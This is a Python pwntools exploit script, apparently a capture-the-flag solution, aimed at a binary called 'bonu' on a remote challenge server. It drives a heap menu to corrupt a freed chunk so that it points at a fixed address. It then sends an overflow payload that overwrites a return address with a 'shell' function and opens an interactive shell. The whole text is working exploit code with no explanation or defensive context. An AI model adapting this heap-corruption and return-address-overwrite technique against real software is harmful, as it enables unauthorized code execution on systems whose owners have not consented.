from pwn import *

context.log_level= 'debug'

def add(size, data):
   p.sendafter('>>', '1')
   p.sendafter('>>', str(size))
   p.sendafter('>>', data)

def delete(idx):
   p.sendafter('>>', '2')
   p.sendafter('>>', str(idx))

def modify(idx, size, data):
   p.sendafter('>>', '3')
   p.sendafter('>>', str(idx))
   p.sendafter('>>', str(size))
   p.sendafter('>>', data)

#p = process('./bonu')
p = remote("pwnable.shop", 20210)
e = ELF('./bonu')
l = e.libc

shell = 0x4008B6 

add(0x100, 'a')
add(0x100, 'a')
delete(0)
modify(0, 19, 'a'*8+p64(0x6020c0))
add(0x100, 'a')

p.sendafter('>>', '4')

payload = 'a' *0x30 + 'b' * 8
payload += p64(shell)

p.sendline(payload)

p.interactive()
